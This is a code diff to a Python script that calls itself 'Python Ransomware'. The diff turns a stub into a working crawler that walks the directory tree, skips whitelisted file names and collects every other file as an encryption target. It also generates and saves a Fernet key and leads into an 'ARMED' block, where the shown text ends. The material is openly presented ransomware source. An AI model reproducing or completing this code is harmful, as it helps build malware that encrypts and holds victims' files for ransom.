@@ -59,24 +59,41 @@ def decrypt_files(files: list, key: bytes) -> None:
             openedFile.write(decrypted_contents)
             
 
-# TODO: Make the crawler #
-def crawl(dir: str):
+def crawl(directory: str) -> list:
 
-    dirs = os.walk(dir, topdown=True)
+    new_targets = []
 
-    return dirs
+    for root, dirs, files in os.walk(directory, topdown=True):
+        print(f"Current directory: {root}")
+        print("File:")
+        for name in files:
+            if any(item in name for item in white_list):
+                continue
+            if root == "./":
+                print(f"  {root}{name}")
+                new_targets.append(f"{root}{name}")
+            else:
+                print(f"  {root}/{name}")
+                new_targets.append(f"{root}/{name}")
+        print("-" * 40)
+
+    return new_targets
 
 
-# TODO: Make it better looking #
 if __name__ == '__main__':
     
+    print("\n\n<<|---| Python Ransomware |---|>>\n\n")
+
     key = Fernet.generate_key()
     save_key(key)
     #key = read_key()
-    print(key)
+    print(f"Key:   {key}")
 
     locate_targets('./')
-    print(targets)
+    print(f"Located targets:   {targets}")
+
+    targets = crawl("./")
+    print(f"Located targets:   {targets}")
 
     if ARMED:
         
